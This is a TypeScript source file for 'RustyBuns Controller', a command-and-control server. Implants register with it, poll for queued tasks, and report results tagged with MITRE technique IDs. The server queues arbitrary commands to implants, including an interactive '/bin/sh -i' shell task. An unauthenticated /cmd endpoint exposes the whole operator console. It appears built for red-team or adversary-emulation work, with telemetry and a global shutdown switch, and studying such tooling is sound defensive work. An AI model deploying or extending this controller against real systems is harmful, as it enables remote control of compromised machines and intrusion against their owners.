import { SessionManager } from "./session.ts";
import { taskEngine } from "./task.ts";
import { logTelemetrySessionRegister, logTelemetryTaskResult, logTelemetryShutdown, logTelemetrySessionStale } from "./telemetry.ts";
import { savePendingTasks, loadPendingTasks, saveConfig, loadConfig, getAllPendingTasks, deletePendingTasks } from "./db.ts";

const PORT = parseInt(process.env.PORT ?? "8080");

const sessionManager = new SessionManager();

interface RegisterPayload {
  uuid: string;
  hostname: string;
  username: string;
  os: string;
  version: string;
  expiry_hours: number;
}

interface TaskResultPayload {
  task_id: string;
  success: boolean;
  output: string;
  error?: string;
  duration_ms: number;
  mitre_id?: string;
  technique?: string;
}

interface PendingTask {
  id: string;
  command: string;
  args?: string[];
}

const pendingTasks: Map<string, PendingTask[]> = new Map();
const shutdownIssued: Set<string> = new Set();

let selectedSession: string | null = null;
let globalShutdown = false;
let dbLoaded = false;

function ensureDbLoaded() {
  if (dbLoaded) return;
  dbLoaded = true;
  const savedShutdown = loadConfig("global_shutdown");
  if (savedShutdown === "true") {
    globalShutdown = true;
    console.log("[!] Loaded persisted global shutdown state. New beacons will receive __shutdown immediately.");
  }
  const dbTasks = getAllPendingTasks();
  for (const [sessionId, tasks] of dbTasks) {
    pendingTasks.set(sessionId, tasks);
  }
}

ensureDbLoaded();

const commands: Record<string, (args: string[]) => void> = {
  list: () => {
    sessionManager.list();
  },

  select: (args) => {
    if (args.length === 0) {
      console.error("Usage: select <session-id>");
      return;
    }
    const session = sessionManager.select(args[0]!);
    if (!session) {
      console.error(`Session ${args[0]} not found.`);
      return;
    }
    selectedSession = session.id;
    console.log(`[*] Selected session: ${session.id} (${session.username}@${session.hostname})`);
  },

  task: (args) => {
    if (args.length === 0) {
      console.error("Usage: task <command> [args...]");
      return;
    }
    if (!selectedSession) {
      console.error("No session selected. Use 'select <id>' first.");
      return;
    }

    const command = args[0]!;
    const cmdArgs = args.slice(1);
    const task = taskEngine.createTask(command, cmdArgs.length > 0 ? cmdArgs : undefined);

    const tasks = pendingTasks.get(selectedSession) ?? [];
    tasks.push({ id: task.id, command, args: cmdArgs.length > 0 ? cmdArgs : undefined });
    pendingTasks.set(selectedSession, tasks);
    savePendingTasks(selectedSession, tasks);

    console.log(`[*] Task queued: ${command} ${cmdArgs.join(" ") || ""} [${task.id}]`);
    console.log(`    Implant will pick it up on next beacon.`);
  },

  "shell-cmd": (args) => {
    if (!selectedSession) {
      console.error("No session selected. Use 'select <id>' first.");
      return;
    }
    const session = sessionManager.select(selectedSession);
    if (!session) {
      console.error("Session not found.");
      return;
    }
    if (session.os !== "linux" && session.os !== "macos") {
      console.error(`shell-cmd only supported on POSIX (linux/macos), not ${session.os}`);
      return;
    }
    const argsToSend = args.length > 0 ? args : ["/bin/sh", "-i"];
    const shellTask = taskEngine.createTask("shell", argsToSend);
    const tasks = pendingTasks.get(selectedSession) ?? [];
    tasks.push({ id: shellTask.id, command: "shell", args: argsToSend });
    pendingTasks.set(selectedSession, tasks);
    savePendingTasks(selectedSession, tasks);
    console.log(`[*] Shell command queued for ${selectedSession} [${shellTask.id}]`);
    console.log(`    NOTE: No PTY allocated. One-shot command execution only.`);
    console.log(`    Results will appear via /results endpoint.`);
  },

  tag: (args) => {
    if (args.length < 2) {
      console.error("Usage: tag <session-id> <label>");
      return;
    }
    sessionManager.tag(args[0]!, args[1]!);
  },

  exit: () => {
    console.log("[*] Shutting down controller...");
    process.exit(0);
  },

  shutdown: () => {
    globalShutdown = true;
    saveConfig("global_shutdown", "true");
    console.log("[!] Global shutdown signaled. All implants will halt on next beacon.");
    const sessions = sessionManager.getAll();
    for (const s of sessions) {
      logTelemetryShutdown(s.id);
    }
  },

  "shutdown-all": () => {
    globalShutdown = true;
    saveConfig("global_shutdown", "true");
    console.log("[!] Global shutdown signaled. All implants will halt on next beacon.");
    const sessions = sessionManager.getAll();
    for (const s of sessions) {
      logTelemetryShutdown(s.id);
    }
  },

  "reset-shutdown": () => {
    globalShutdown = false;
    shutdownIssued.clear();
    saveConfig("global_shutdown", "false");
    console.log("[!] Global shutdown state reset. New implants will not auto-halt.");
  },

  help: () => {
    console.log(`\nAvailable commands:\n`);
    console.log(`  list                              — List all active sessions`);
    console.log(`  select <session-id>               — Select a session for tasking`);
    console.log(`  task <command> [args...]          — Queue a task for the selected session`);
    console.log(`  shell-cmd [args...]               — Queue a one-shot shell command (no PTY)`);
    console.log(`  tag <session-id> <label>          — Tag a session with a label`);
    console.log(`  shutdown                          — Signal global shutdown to all implants`);
    console.log(`  shutdown-all                      — Alias for shutdown`);
    console.log(`  reset-shutdown                    — Reset global shutdown state`);
    console.log(`  exit                              — Shut down this controller`);
    console.log(`  help                              — Show this help message\n`);
  },
};

function handleCommand(line: string) {
  const trimmed = line.trim();
  if (!trimmed) return;

  const parts = trimmed.split(/\s+/);
  const cmd = parts[0]!.toLowerCase();
  const args = parts.slice(1);

  const handler = commands[cmd];
  if (handler) {
    handler(args);
  } else {
    console.log(`Unknown command: ${cmd}. Type 'help' for available commands.`);
  }
}

function isValidUuid(s: string): boolean {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(s);
}

const server = Bun.serve({
  port: PORT,
  async fetch(req) {
    const url = new URL(req.url);
    const path = url.pathname;

    if (req.method === "POST") {
      if (path === "/register") {
        try {
          const payload: RegisterPayload = await req.json();
          const session = sessionManager.register(payload);
          logTelemetrySessionRegister(session);
          return Response.json({ status: "ok", sessionId: session.id });
        } catch (e) {
          console.error("[!] Failed to parse register payload:", e);
          return Response.json({ status: "error", message: "invalid payload" }, { status: 400 });
        }
      }

      if (path.startsWith("/results/")) {
        const uuid = path.split("/")[2];
        if (!uuid || !isValidUuid(uuid)) {
          return Response.json({ status: "error", message: "invalid session id" }, { status: 400 });
        }
        try {
          const result: TaskResultPayload = await req.json();
          taskEngine.storeResult({
            task_id: result.task_id,
            success: result.success,
            output: result.output,
            error: result.error,
            duration_ms: result.duration_ms,
            mitre_id: result.mitre_id,
            technique: result.technique,
          });
          logTelemetryTaskResult({ ...result, session_id: uuid });
          return Response.json({ status: "ok" });
        } catch (e) {
          console.error("[!] Failed to parse result payload:", e);
          return Response.json({ status: "error" }, { status: 400 });
        }
      }

      if (path.startsWith("/tasks/")) {
        const uuid = path.split("/")[2];
        if (!uuid || !isValidUuid(uuid)) {
          return Response.json({ status: "error", message: "invalid session id" }, { status: 400 });
        }
        const body = await req.json().catch(() => null);
        if (body && Array.isArray(body.tasks)) {
          const session = sessionManager.select(uuid);
          if (session) {
            const tasks = pendingTasks.get(uuid) ?? [];
            for (const t of body.tasks) {
              tasks.push(t as PendingTask);
            }
            pendingTasks.set(uuid, tasks);
            savePendingTasks(uuid, tasks);
          }
        }
        return Response.json({ status: "ok" });
      }
    }

    if (req.method === "GET") {
      if (path.startsWith("/tasks/")) {
        const uuid = path.split("/")[2];
        if (!uuid || !isValidUuid(uuid)) {
          return Response.json({ status: "error", message: "invalid session id" }, { status: 400 });
        }
        const session = sessionManager.select(uuid);
        if (!session) {
          return Response.json({ tasks: [] }, { status: 404 });
        }
        sessionManager.touch(uuid);
        let tasks = pendingTasks.get(uuid) ?? [];
        if (tasks.length > 0) {
          pendingTasks.set(uuid, []);
          deletePendingTasks(uuid);
        }
        if (globalShutdown && !shutdownIssued.has(uuid)) {
          tasks.unshift({ id: "shutdown", command: "__shutdown" });
          shutdownIssued.add(uuid);
        }
        return Response.json({ tasks });
      }

      if (path === "/shutdown") {
        return Response.json({ shutdown: globalShutdown });
      }
    }

    if (req.method === "POST" && path === "/cmd") {
      const body = await req.text();
      handleCommand(body);
      return Response.json({ status: "ok" });
    }

    if (req.method === "GET" && path === "/cmd") {
      return Response.json({ status: "error", message: "Method Not Allowed" }, { status: 405 });
    }

    return Response.json({ status: "not found" }, { status: 404 });
  },
});

console.log(`[+] RustyBuns Controller listening on port ${PORT} (HTTP)`);
console.log(`    Register endpoint: POST /register`);
console.log(`    Tasks endpoint:    GET  /tasks/<uuid>  — implant polls here`);
console.log(`    Tasks endpoint:    POST /tasks/<uuid>  — controller queues tasks`);
console.log(`    Results endpoint:  POST /results/<uuid>`);
console.log(`    Shell endpoint:    POST /cmd            — send controller commands`);
console.log(`    Commands:          list, select, task, shell-cmd, tag, shutdown, shutdown-all, reset-shutdown, help, exit`);
console.log(`    Stale check:      Every 60s (removes sessions with no beacon)`);
console.log(``);
sessionManager.startStaleCheck(60000, (session) => {
  logTelemetrySessionStale(session);
});
console.log(`\nSessions are created when implants register.`);
console.log(`Use curl to interact:\n`);
console.log(`  # Register a test session`);
console.log(`  curl -X POST http://localhost:${PORT}/register -H "Content-Type: application/json" -d '{"uuid":"test-123","hostname":"test-host","username":"testuser","os":"macos","version":"0.1.0","expiry_hours":8}'`);
console.log(`\n  # Send a task`);
console.log(`  curl -X POST http://localhost:${PORT}/tasks/test-123 -H "Content-Type: application/json" -d '{"tasks":[{"id":"abc","command":"whoami"}]}'`);
console.log(`\n  # List sessions (via controller shell)`);
console.log(`  curl -X POST http://localhost:${PORT}/cmd -d 'list'\n`);
